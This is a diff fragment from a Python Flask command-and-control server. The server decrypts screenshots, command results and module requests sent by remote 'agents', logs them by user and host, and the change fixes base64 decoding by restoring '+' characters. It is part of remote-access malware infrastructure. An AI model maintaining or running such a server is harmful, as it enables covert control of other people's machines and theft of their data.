@@ -277,7 +277,7 @@ def image():
     data = request.form['data']
     fn=id+''.join(random.choice(string.ascii_lowercase) for i in range(5))
     if AGENTS.get(id) != None and data != None:
-        data = decrypt_file(AESKey,data.split(":")[1].split(":")[0])
+        data = decrypt_file(AESKey,data.replace(" ","+").split(":")[1].split(":")[0])
         fp = open('images/%s.png' % fn, 'wb')
         fp.write(data)
         fp.close()
@@ -318,7 +318,7 @@ def result():
     #print id,data
     if AGENTS.get(id) != None and data != None:
         #data = data.decode('base64')
-        data = decrypt(AESKey,data)
+        data = decrypt(AESKey,data.replace(" ","+"))
         data=data.encode('ascii','ignore')
         p_out = '[+] Agent (%d) - %s@%s\\%s send Result' % (AGENTS[id][0], AGENTS[id][7],AGENTS[id][6],AGENTS[id][5])
         history=file("c2-logs.txt","a")
@@ -357,7 +357,7 @@ def modules():
     data = request.form['data']
 
     if AGENTS.get(id) != None and data != None:
-        data=decrypt(AESKey,data).replace('\00', '')
+        data=decrypt(AESKey,data.replace(" ","+")).replace('\00', '')
         p_out = '[+] New Agent Request Module %s (%s - %s)' % (data, AGENTS[id][0], AGENTS[id][7])
         print bcolors.OKGREEN + p_out + bcolors.ENDC
         try:
